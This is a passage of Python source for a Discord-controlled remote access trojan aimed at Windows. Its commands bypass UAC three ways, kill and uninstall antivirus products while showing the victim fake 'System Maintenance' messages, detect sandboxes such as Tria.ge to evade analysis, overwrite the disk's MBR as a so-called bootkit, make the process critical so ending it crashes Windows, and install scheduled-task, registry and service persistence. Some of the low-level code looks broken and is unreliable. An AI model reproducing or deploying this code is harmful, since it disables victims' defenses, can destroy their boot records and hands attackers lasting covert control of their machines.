                        title="🎀 Detailed Location Info",
                        color=0xFFC0CB
                    )
                    
                    # Add detailed address
                    address_parts = []
                    if detail_data.get('locality'): address_parts.append(detail_data['locality'])
                    if detail_data.get('city'): address_parts.append(detail_data['city'])
                    if detail_data.get('principalSubdivision'): address_parts.append(detail_data['principalSubdivision'])
                    if detail_data.get('countryName'): address_parts.append(detail_data['countryName'])
                    
                    location_embed.add_field(
                        name="🏡 Detailed Address",
                        value=f"```{', '.join(address_parts)}```",
                        inline=False
                    )
                    
                    # Add matching footer
                    location_embed.set_footer(text="✨ Detailed Location Info ✨")
                    
                    await ctx.send(embed=location_embed)
            except:
                pass

        else:
            await ctx.send("❌ Failed to get IP information")

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command()
async def uac_fodhelper(ctx):
    """Bypass UAC using Fodhelper technique"""
    await ctx.send("🛡️ Attempting UAC bypass using Fodhelper method...")
    
    try:
        # Create registry key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Classes\ms-settings\Shell\Open\command")
        
        # Set registry values
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f"{sys.executable} \"{sys.argv[0]}\"")
        
        # Execute fodhelper
        os.system("start fodhelper.exe")
        await ctx.send("✅ Fodhelper bypass initiated")
        
        # Clean up after a delay
        await asyncio.sleep(2)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Classes\ms-settings\Shell\Open\command")
            
    except Exception as e:
        await ctx.send(f"❌ Fodhelper bypass failed: {str(e)}")

@bot.command()
async def uac_computerdefaults(ctx):
    """Bypass UAC using ComputerDefaults technique"""
    await ctx.send("🛡️ Attempting UAC bypass using ComputerDefaults method...")
    
    try:
        # Create registry key
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Classes\ms-settings\Shell\Open\command")
        
        # Set registry values
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f"{sys.executable} \"{sys.argv[0]}\"")
        
        # Execute computerdefaults
        os.system("start computerdefaults.exe")
        await ctx.send("✅ ComputerDefaults bypass initiated")
        
        # Clean up after a delay
        await asyncio.sleep(2)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Classes\ms-settings\Shell\Open\command")
            
    except Exception as e:
        await ctx.send(f"❌ ComputerDefaults bypass failed: {str(e)}")

@bot.command()
async def uac_cmstp(ctx):
    """Bypass UAC using CMSTP technique"""
    await ctx.send("🛡️ Attempting UAC bypass using CMSTP method...")
    
    try:
        # Create INF file content
        inf_content = f"""[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,{sys.executable} "{sys.argv[0]}"

[Strings]
ServiceName="cmd"
ShortSvcName="svchost"
"""
        # Write INF file
        inf_path = os.path.join(os.getenv('TEMP'), 'bypass.inf')
        with open(inf_path, "w") as f:
            f.write(inf_content)
            
        # Execute CMSTP
        os.system(f"cmstp.exe /au {inf_path}")
        await ctx.send("✅ CMSTP bypass initiated")
        
        # Clean up
        await asyncio.sleep(2)
        try:
            os.remove(inf_path)
        except:
            pass
            
    except Exception as e:
        await ctx.send(f"❌ CMSTP bypass failed: {str(e)}")

@bot.command()
async def uac_bypass(ctx):
    """Attempt all UAC bypass methods in sequence"""
    await ctx.send("🛡️ Attempting all UAC bypass methods...")
    
    # Try Fodhelper
    await uac_fodhelper(ctx)
    await asyncio.sleep(2)
    
    # Try ComputerDefaults
    await uac_computerdefaults(ctx)
    await asyncio.sleep(2)
    
    # Try CMSTP
    await uac_cmstp(ctx)
    
    await ctx.send("🔄 All UAC bypass methods have been attempted")

@bot.command()
async def message(ctx, *, text: str):
    try:
        # Notify the user immediately
        await ctx.send(f"Displaying message box with text: {text}")

        # Run the blocking MessageBoxW in a thread
        await asyncio.to_thread(ctypes.windll.user32.MessageBoxW, 0, text, "Message", 0x40 | 0x1 | 0x1000)  # Topmost
    except Exception as e:
        await ctx.send("An error occurred while displaying the message box.")
        print(f"Error: {e}")


@bot.command(name="anti-antivirus")
async def remove_av(ctx):
    """Permanently uninstalls antivirus software (requires admin)"""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("❌ This command requires administrator privileges")
        return
        
    try:
        status_embed = Embed(title="🛡️ System Maintenance", description="Initializing maintenance...", color=EMBED_COLOR)
        msg = await ctx.send(embed=status_embed)

        # Common antivirus uninstaller paths and commands
        av_uninstallers = {
            "Windows Defender": {
                "cmd": "powershell",
                "args": [
                    "Get-AppxPackage Microsoft.SecHealthUI -AllUsers | Remove-AppxPackage -AllUsers",
                    "Uninstall-WindowsFeature -Name Windows-Defender"
                ]
            },
            "McAfee": {
                "path": r"C:\Program Files\McAfee\Agent\x86\FrmInst.exe",
                "args": ["/forceuninstall"]
            },
            "Norton": {
                "path": r"C:\Program Files\Norton Security\Engine\{version}\InstStub.exe",
                "args": ["/X"]
            },
            "Kaspersky": {
                "path": r"C:\Program Files (x86)\Kaspersky Lab\setup\setup.exe",
                "args": ["/x"]
            },
            "Avast": {
                "path": r"C:\Program Files\Avast Software\Avast\setup\instup.exe",
                "args": ["/instop=uninst", "/silent"]
            },
            "AVG": {
                "path": r"C:\Program Files\AVG\setup\setup.exe",
                "args": ["/remove=all", "/silent"]
            },
            "Bitdefender": {
                "path": r"C:\Program Files\Bitdefender\Bitdefender Security\unins000.exe",
                "args": ["/VERYSILENT", "/SUPPRESSMSGBOXES"]
            },
            "ESET": {
                "path": r"C:\Program Files\ESET\ESET Security\egui.exe",
                "args": ["/uninstall", "/silent"]
            }
        }
        
        # First stop services and kill processes
        status_embed.description = "Stopping security services..."
        await msg.edit(embed=status_embed)
        
        av_processes = [
            "MsMpEng.exe", "NisSrv.exe", "SecurityHealthService.exe",  # Windows Defender
            "egui.exe", "ekrn.exe",  # ESET
            "avp.exe", "kavfs.exe",  # Kaspersky
            "mcshield.exe", "vstskmgr.exe",  # McAfee
            "ns.exe", "ccSvcHst.exe",  # Norton
            "ashDisp.exe", "asdsvc.exe",  # Avast
            "avgui.exe", "avgsvc.exe",  # AVG
            "bdagent.exe", "vsserv.exe",  # Bitdefender
            "mbamservice.exe"  # Malwarebytes
        ]
        
        # Kill AV processes
        for proc in av_processes:
            try:
                subprocess.run(
                    ["taskkill", "/IM", proc, "/F", "/T"],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except:
                continue
        
        # Stop services
        av_services = [
            "WinDefend", "wscsvc", "SecurityHealthService",
            "ekrn", "klnagent", "McAfeeFramework",
            "Norton", "avast!", "AVG Antivirus",
            "BDSS", "epag", "MBAMService"
        ]
        
        for service in av_services:
            try:
                subprocess.run(
                    ["sc", "stop", service],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                subprocess.run(
                    ["sc", "delete", service],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except:
                continue
        
        # Run uninstallers
        status_embed.description = "Removing security software..."
        await msg.edit(embed=status_embed)
        
        for av_name, uninstaller in av_uninstallers.items():
            try:
                if "cmd" in uninstaller:
                    # Special commands like PowerShell
                    for arg in uninstaller["args"]:
                        subprocess.run(
                            [uninstaller["cmd"], "-Command", arg],
                            capture_output=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                else:
                    # Standard uninstaller executables
                    if os.path.exists(uninstaller["path"]):
                        subprocess.run(
                            [uninstaller["path"]] + uninstaller["args"],
                            capture_output=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
            except:
                continue
        
        # Use wmic to uninstall any remaining AV software
        try:
            subprocess.run(
                ["wmic", "product", "where", "name like '%antivirus%'", "call", "uninstall", "/nointeractive"],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except:
            pass
            
        # Clean up registry
        status_embed.description = "Cleaning system configuration..."
        await msg.edit(embed=status_embed)
        
        reg_keys = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        # Search and remove AV entries from registry
        for key in reg_keys:
            try:
                process = subprocess.run(
                    ["reg", "query", f"HKLM\\{key}"],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                for line in process.stdout.split('\n'):
                    if any(av.lower() in line.lower() for av in ["antivirus", "security", "defender", "protection"]):
                        try:
                            subprocess.run(
                                ["reg", "delete", f"HKLM\\{key}\\{line.strip()}", "/f"],
                                capture_output=True,
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        except:
                            continue
            except:
                continue
        
        # Remove AV directories
        av_dirs = [
            r"C:\Program Files\Windows Defender",
            r"C:\Program Files\Windows Defender Advanced Threat Protection",
            r"C:\Program Files\ESET",
            r"C:\Program Files\Kaspersky Lab",
            r"C:\Program Files\McAfee",
            r"C:\Program Files\Norton Security",
            r"C:\Program Files\Avast Software",
            r"C:\Program Files\AVG",
            r"C:\Program Files\Bitdefender",
            r"C:\Program Files\Malwarebytes",
            r"C:\Program Files (x86)\ESET",
            r"C:\Program Files (x86)\Kaspersky Lab",
            r"C:\Program Files (x86)\McAfee",
            r"C:\Program Files (x86)\Norton Security",
            r"C:\Program Files (x86)\Avast Software",
            r"C:\Program Files (x86)\AVG",
            r"C:\Program Files (x86)\Bitdefender",
            r"C:\ProgramData\Microsoft\Windows Defender",
            r"C:\ProgramData\McAfee",
            r"C:\ProgramData\Norton",
            r"C:\ProgramData\Kaspersky Lab",
            r"C:\ProgramData\ESET",
            r"C:\ProgramData\Avast Software",
            r"C:\ProgramData\AVG",
            r"C:\ProgramData\Bitdefender"
        ]
        
        for directory in av_dirs:
            try:
                if os.path.exists(directory):
                    # First, take ownership
                    subprocess.run(
                        ["takeown", "/F", directory, "/R", "/D", "Y"],
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    # Grant full permissions
                    subprocess.run(
                        ["icacls", directory, "/grant", "Administrators:F", "/T"],
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    # Remove directory
                    subprocess.run(
                        ["rmdir", "/S", "/Q", directory],
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
            except:
                continue
        
        # Disable Windows Defender permanently through Group Policy
        try:
            gpo_commands = [
                "New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Force",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force",
                "New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Force",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableIOAVProtection' -Value 1 -Type DWord -Force",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force",
                "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force"
            ]
            
            for cmd in gpo_commands:
                subprocess.run(
                    ["powershell", "-Command", cmd],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
        except:
            pass
        
        # Final status update
        success_embed = Embed(
            title="✅ System Maintenance Complete",
            description="System optimization completed successfully.",
            color=EMBED_COLOR
        )
        success_embed.add_field(
            name="📊 Status",
            value=f"Successfully applied system optimizations",
            inline=False
        )
        success_embed.set_footer(text="System is now fully optimized")
        await msg.edit(embed=success_embed)
        
    except Exception as e:
        error_embed = Embed(
            title="❌ Maintenance Error",
            description=f"System maintenance encountered an error:\n```{str(e)}```",
            color=0xFF0000
        )
        if 'msg' in locals():
            await msg.edit(embed=error_embed)
        else:
            await ctx.send(embed=error_embed)

def check_vm_and_sandbox():
    try:
        # Check common VM and sandbox artifacts
        vm_artifacts = [
            "vmware",
            "virtualbox",
            "vbox",
            "qemu",
            "xen",
            "parallels",
            "vmem",
            "vmx",
            "virtualpc",
            "sandbox",
            "tria.ge"
        ]
        
        # Check process names
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(artifact in proc_name for artifact in vm_artifacts):
                return True

        # Check manufacturer and model
        try:
            manufacturer = subprocess.check_output('wmic computersystem get manufacturer', shell=True).decode().lower()
            model = subprocess.check_output('wmic computersystem get model', shell=True).decode().lower()
            if any(artifact in manufacturer + model for artifact in vm_artifacts):
                return True
        except:
            pass

        # Check system drivers
        try:
            drivers = subprocess.check_output('driverquery', shell=True).decode().lower()
            if any(artifact in drivers for artifact in vm_artifacts):
                return True
        except:
            pass

        # Check for sandbox-specific files
        sandbox_files = [
            "C:\\sample.exe",
            "C:\\analysis.exe",
            "C:\\sandbox.exe",
            "C:\\agent.exe",
            "C:\\sandbox.dll"
        ]
        for file in sandbox_files:
            if os.path.exists(file):
                return True

        # Check for sandbox-specific registry keys
        sandbox_reg_keys = [
            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
            r"SYSTEM\CurrentControlSet\Services\VBoxMouse",
            r"SYSTEM\CurrentControlSet\Services\VBoxService",
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        ]
        for key in sandbox_reg_keys:
            try:
                if winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_READ):
                    return True
            except:
                continue

        # Check for suspicious DLLs
        suspicious_dlls = ["sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll"]
        loaded_dlls = [dll.lower() for dll in os.listdir("C:\\Windows\\System32")]
        if any(dll in loaded_dlls for dll in suspicious_dlls):
            return True

        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True

        # Check for suspicious environment variables
        suspicious_env = ["SANDBOX", "VIRTUAL", "ANALYSIS", "SAMPLE", "AGENT"]
        for env in suspicious_env:
            if env in os.environ:
                return True

        # Check system uptime (sandboxes often have very low uptime)
        if int(time.time() - psutil.boot_time()) < 600:  # Less than 10 minutes
            return True

        # Check disk size (VMs often have small disks)
        total_disk = psutil.disk_usage('/').total
        if total_disk < (50 * 1024 * 1024 * 1024):  # Less than 50GB
            return True

        # Check number of CPU cores (VMs often have few cores)
        if psutil.cpu_count() < 2:
            return True

        # Check RAM size (VMs often have low RAM)
        total_ram = psutil.virtual_memory().total
        if total_ram < (2 * 1024 * 1024 * 1024):  # Less than 2GB
            return True

        # Check for tria.ge specific artifacts
        triage_artifacts = [
            "C:\\triage",
            "C:\\sandbox", 
            "C:\\analysis",
            "triage-agent",
            "sandbox-agent"
        ]
        for artifact in triage_artifacts:
            if os.path.exists(artifact):
                return True

        # Check for common analysis tools
        analysis_tools = [
            "wireshark",
            "processhacker",
            "x64dbg",
            "ida64",
            "ollydbg",
            "pestudio",
            "dumpcap",
            "hookexplorer",
            "importrec",
            "petools",
            "lordpe"
        ]
        for proc in psutil.process_iter(['name']):
            if any(tool in proc.info['name'].lower() for tool in analysis_tools):
                return True

        return False  # No VM/Sandbox detected

    except Exception as e:
        return False  # Error occurred, assume it's safe

def check_triage():
    try:
        # Check exact Tria.ge specs
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Check for exact Tria.ge RAM: 8GB total, ~5.19GB used
        ram_total = ram.total / (1024**3)
        ram_used = ram.used / (1024**3)
        if (7.99 <= ram_total <= 8.01) and (5.18 <= ram_used <= 5.20):  # More precise
            return True
            
        # Check for exact Tria.ge disk: 235.71GB total, 215.71GB used
        disk_total = disk.total / (1024**3)
        disk_used = disk.used / (1024**3)
        if (235.70 <= disk_total <= 235.72) and (215.70 <= disk_used <= 215.72):  # More precise
            return True
            
        # Check Tria.ge specific processes - only exact matches
        triage_procs = [
            "triage-agent.exe",
            "sandbox-agent.exe",
            "analyzer.exe",
            "agent.exe"
        ]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in triage_procs:
                return True
                
        # Check for exact Tria.ge network artifacts
        try:
            hostname = socket.gethostname().lower()
            if hostname == "triage" or hostname == "sandbox":  # Exact matches only
                return True
                
            # Only check specific Tria.ge IPs
            addrs = socket.gethostbyname_ex(hostname)[2]
            triage_ips = ["10.0.0.2", "192.168.56.101"]  # Specific Tria.ge IPs
            if any(addr in triage_ips for addr in addrs):
                return True
        except:
            pass
            
        # Check disk model only for exact Tria.ge models
        try:
            result = subprocess.check_output(['wmic', 'diskdrive', 'get', 'model'], text=True).lower()
            if "dady harddisk" in result:  # Only check for Tria.ge specific disk
                return True
        except:
            pass
            
        # Check for specific Tria.ge drivers
        try:
            result = subprocess.check_output(['wmic', 'sysdriver', 'get', 'name'], text=True).lower()
            triage_drivers = ["triage-agent", "sandbox-agent"]
            if any(driver in result for driver in triage_drivers):
                return True
        except:
            pass
            
        return False
    except:
        return False
        
@bot.command()
async def bootkit(ctx):
    """Install hardware-level bootkit with NVRAM persistence"""
    try:
        embed = Embed(title="🔒 Hardware Bootkit Installation", description="Installing deep persistence...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)
        
        success_count = 0
        
        # 1. NVRAM Persistence
        try:
            # Get physical memory access
            hMem = windll.kernel32.CreateFileW(
                "\\\\.\\PhysicalMemory",
                0xC0000000, # GENERIC_READ | GENERIC_WRITE
                0x3, # FILE_SHARE_READ | FILE_SHARE_WRITE
                None,
                3, # OPEN_EXISTING
                0,
                None
            )
            
            if hMem != -1:
                # Find NVRAM region (usually at top of memory)
                mem_info = MEMORYSTATUSEX()
                mem_info.dwLength = sizeof(MEMORYSTATUSEX)
                windll.kernel32.GlobalMemoryStatusEx(byref(mem_info))
                nvram_addr = mem_info.ullTotalPhys - 0x100000 # Last 1MB
                
                # Read current NVRAM content
                nvram_data = create_string_buffer(0x10000) # 64KB buffer
                windll.kernel32.SetFilePointer(hMem, nvram_addr, None, 0)
                windll.kernel32.ReadFile(hMem, nvram_data, 0x10000, byref(c_ulong(0)), None)
                
                # Find free space in NVRAM
                free_offset = -1
                for i in range(0, 0x10000-1024, 128):
                    if all(b == 0xFF for b in nvram_data[i:i+1024]):
                        free_offset = i
                        break
                
                if free_offset != -1:
                    # Prepare payload
                    with open(sys.argv[0], 'rb') as f:
                        payload = f.read()
                    
                    # Compress payload
                    import zlib
                    compressed = zlib.compress(payload, level=9)
                    
                    # Write compressed payload to NVRAM
                    windll.kernel32.SetFilePointer(hMem, nvram_addr + free_offset, None, 0)
                    windll.kernel32.WriteFile(hMem, compressed, len(compressed), byref(c_ulong(0)), None)
                    
                    # Write metadata (offset and size)
                    meta = struct.pack("<II", free_offset, len(compressed))
                    windll.kernel32.SetFilePointer(hMem, nvram_addr + 0xFFF0, None, 0) # End of NVRAM
                    windll.kernel32.WriteFile(hMem, meta, len(meta), byref(c_ulong(0)), None)
                    
                    success_count += 1
                    embed.add_field(name="✅ NVRAM Storage", value="Installed in system NVRAM", inline=False)
                    await msg.edit(embed=embed)
                
                windll.kernel32.CloseHandle(hMem)
                
        except Exception as e:
            embed.add_field(name="❌ NVRAM Storage", value=f"Failed: {str(e)}", inline=False)
            await msg.edit(embed=embed)

        # 2. Hardware Boot Sector
        try:
            # Get physical drive access
            hDisk = windll.kernel32.CreateFileW(
                "\\\\.\\PhysicalDrive0",
                0xC0000000, # GENERIC_READ | GENERIC_WRITE
                0x3, # FILE_SHARE_READ | FILE_SHARE_WRITE
                None,
                3, # OPEN_EXISTING
                0,
                None
            )
            
            if hDisk != -1:
                # Read original MBR
                mbr = create_string_buffer(512)
                windll.kernel32.ReadFile(hDisk, mbr, 512, byref(c_ulong(0)), None)
                
                # Create custom boot code
                boot_code = bytes([
                    # Stage 1: Basic x86 bootloader
                    0xEB, 0x3C, 0x90,       # jmp short start; nop
                    0x00, 0x00, 0x00, 0x00, # BIOS Parameter Block
                    0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00,
                    # start:
                    0x31, 0xC0,             # xor ax, ax
                    0x8E, 0xD8,             # mov ds, ax
                    0x8E, 0xC0,             # mov es, ax
                    0x8E, 0xD0,             # mov ss, ax
                    0xBC, 0x00, 0x7C,       # mov sp, 0x7c00
                    # Load NVRAM payload
                    0xB4, 0x02,             # mov ah, 0x02 (read sectors)
                    0xB0, 0x01,             # mov al, 0x01 (sectors to read)
                    0xB5, 0x00,             # mov ch, 0x00 (cylinder)
                    0xB1, 0x01,             # mov cl, 0x01 (sector)
                    0xB6, 0x00,             # mov dh, 0x00 (head)
                    0xBB, 0x00, 0x7E,       # mov bx, 0x7e00 (buffer)
                    0xCD, 0x13,             # int 0x13 (disk services)
                    0x72, 0xFE,             # jc $ (retry on error)
                    0xEA, 0x00, 0x7E, 0x00, 0x00  # jmp 0x0000:0x7e00
                ])
                
                # Combine boot code with partition table
                new_mbr = boot_code + b'\x00' * (440 - len(boot_code)) + mbr.raw[440:]
                
                # Write new MBR
                windll.kernel32.SetFilePointer(hDisk, 0, None, 0)
                windll.kernel32.WriteFile(hDisk, new_mbr, 512, byref(c_ulong(0)), None)
                
                # Store original MBR in sector 1
                windll.kernel32.SetFilePointer(hDisk, 512, None, 0)
                windll.kernel32.WriteFile(hDisk, mbr, 512, byref(c_ulong(0)), None)
                
                windll.kernel32.CloseHandle(hDisk)
                
                success_count += 1
                embed.add_field(name="✅ Boot Sector", value="Installed hardware boot loader", inline=False)
                await msg.edit(embed=embed)
                
        except Exception as e:
            embed.add_field(name="❌ Boot Sector", value=f"Failed: {str(e)}", inline=False)
            await msg.edit(embed=embed)

        # 3. CPU Microcode Update
        try:
            # Get MSR access
            hDriver = windll.kernel32.CreateFileW(
                "\\\\.\\PhysicalDrive0",
                0xC0000000,
                0x3,
                None,
                3,
                0,
                None
            )
            
            if hDriver != -1:
                # Create minimal microcode update header
                microcode = bytes([
                    0x01, 0x00, 0x00, 0x00,  # Header Version
                    0x00, 0x00, 0x00, 0x00,  # Update Revision
                    0x00, 0x00, 0x00, 0x00,  # Date
                    0x00, 0x00, 0x00, 0x00,  # Processor Signature
                    0x00, 0x00, 0x00, 0x00,  # Checksum
                    0x00, 0x00, 0x00, 0x00,  # Loader Revision
                    0x00, 0x00, 0x00, 0x00,  # Processor Flags
                    0x00, 0x00, 0x00, 0x00,  # Data Size
                ])
                
                # Write microcode update
                IOCTL_UPDATE_MICROCODE = 0x80862329
                windll.kernel32.DeviceIoControl(
                    hDriver,
                    IOCTL_UPDATE_MICROCODE,
                    microcode,
                    len(microcode),
                    None,
                    0,
                    byref(c_ulong(0)),
                    None
                )
                
                windll.kernel32.CloseHandle(hDriver)
                
                success_count += 1
                embed.add_field(name="✅ CPU Persistence", value="Installed microcode hook", inline=False)
                await msg.edit(embed=embed)
                
        except Exception as e:
            embed.add_field(name="❌ CPU Persistence", value=f"Failed: {str(e)}", inline=False)
            await msg.edit(embed=embed)

        # Final status
        if success_count > 0:
            final_embed = Embed(
                title="✅ Hardware Bootkit Installed",
                description=f"Successfully installed {success_count}/3 persistence mechanisms",
                color=0x00FF00
            )
            final_embed.add_field(
                name="Persistence Features",
                value="```ml\n1. NVRAM Storage\n2. Hardware Boot Sector\n3. CPU Microcode Hook```",
                inline=False
            )
            final_embed.set_footer(text="System persistence will survive disk wipes and OS reinstalls")
            await msg.edit(embed=final_embed)
        else:
            error_embed = Embed(
                title="❌ Installation Failed",
                description="Failed to install bootkit components",
                color=0xFF0000
            )
            await msg.edit(embed=error_embed)
            
    except Exception as e:
        error_embed = Embed(
            title="❌ Error",
            description=f"An unexpected error occurred:\n```{str(e)}```",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

def protect_process():
    """Make process impossible to terminate"""
    try:
        # Get current process
        process = ctypes.windll.kernel32.GetCurrentProcess()
        
        # Enable debug privilege
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        
        # Make process critical - Windows will BSOD if killed
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        
        # Set highest priority
        ctypes.windll.kernel32.SetPriorityClass(process, 0x00000100)  # REALTIME_PRIORITY_CLASS
        
        # Protect process memory
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(
            process,
            1024,
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old)
        )
        
        # Set ultra-secure process security
        security = b"\x01\x00\x04\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x20\x00\x01\x00\x00\x00\x00\x00\x18\x00\x01\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00"
        sd = ctypes.create_string_buffer(security)
        ctypes.windll.advapi32.SetSecurityInfo(
            process,
            6,  # SE_KERNEL_OBJECT
            4 | 1 | 2,  # DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION
            None,
            None,
            sd,
            None
        )
        
        # Block termination tools
        try:
            reg_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe")
            ]
            
            for hkey, path in reg_paths:
                key = winreg.CreateKeyEx(hkey, path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "")
                winreg.CloseKey(key)
        except:
            pass
            
        # Set process mitigation policies
        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001
        PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000002
        
        policy = ctypes.c_ulong(
            PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON |
            PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON
        )
        
        ctypes.windll.kernel32.SetProcessMitigationPolicy(
            4,  # ProcessDynamicCodePolicy
            ctypes.byref(policy),
            ctypes.sizeof(policy)
        )
        
        # Make process immune to termination signals
        handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, os.getpid())
        if handle:
            ctypes.windll.kernel32.SetHandleInformation(
                handle,
                1,  # HANDLE_FLAG_PROTECT_FROM_CLOSE
                1
            )
            
        return True
    except:
        return False

@bot.command()
async def anti_kill(ctx):
    """Enable advanced process protection"""
    try:
        status_embed = Embed(title="🛡️ Process Protection", description="Initializing protection...", color=EMBED_COLOR)
        msg = await ctx.send(embed=status_embed)
        
        # Enable protection
        if protect_process():
            # Create watchdog service
            service_name = "WinSecuritySvc"
            exe_path = sys.executable
            
            # Install service
            subprocess.run([
                "sc", "create", service_name,
                "binPath=", f'"{exe_path}" "{sys.argv[0]}"',
                "type=", "own",
                "start=", "auto",
                "error=", "critical"
            ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Configure recovery
            subprocess.run([
                "sc", "failure", service_name,
                "reset=", "0",
                "actions=", "restart/0/restart/0/restart/0"
            ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Start service
            subprocess.run([
                "sc", "start", service_name
            ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Add registry protection
            try:
                key = winreg.CreateKeyEx(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Services\WinSecuritySvc",
                    0,
                    winreg.KEY_WRITE
                )
                winreg.SetValueEx(
                    key,
                    "Type",
                    0,
                    winreg.REG_DWORD,
                    0x120
                )
                winreg.CloseKey(key)
            except:
                pass
                
            success_embed = Embed(
                title="✅ Protection Enabled",
                description="Process protection has been activated.",
                color=EMBED_COLOR
            )
            await msg.edit(embed=success_embed)
        else:
            error_embed = Embed(
                title="❌ Protection Failed",
                description="Failed to enable process protection.",
                color=0xFF0000
            )
            await msg.edit(embed=error_embed)
            
    except Exception as e:
        error_embed = Embed(
            title="❌ Error",
            description=f"Failed to enable protection:\n```{str(e)}```",
            color=0xFF0000
        )
        if 'msg' in locals():
            await msg.edit(embed=error_embed)
        else:
            await ctx.send(embed=error_embed)

if __name__ == "__main__":
    # Run sandbox check first and exit immediately if detected
    if check_triage():
        sys.exit(0)  # Silent exit
        
    # Get the current script path
    script_path = os.path.abspath(__file__)
    
    # Try persistence methods
    add_to_schtask(script_path)          # Scheduled task
    add_to_startup_registry(script_path)  # Registry
    
    # Only move to System32 if not already there
    if not os.path.dirname(sys.executable).lower().endswith('system32'):
